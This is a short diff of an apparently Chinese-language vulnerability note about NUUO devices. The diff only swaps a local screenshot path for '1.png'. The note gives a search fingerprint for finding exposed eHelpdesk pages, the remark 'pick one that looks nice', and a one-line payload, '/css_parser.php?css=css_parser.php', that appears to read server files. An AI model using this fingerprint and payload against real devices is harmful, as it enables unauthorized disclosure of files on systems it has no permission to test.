@@ -6,7 +6,7 @@ body="www.nuuo.com/eHelpdesk.php"
 
 找个顺眼的
 
-![](C:\Users\29942\Desktop\屏幕截图%202025-10-31%20214833.png)
+![](1.png)
 
 payload:/css_parser.php?css=css_parser.php
 
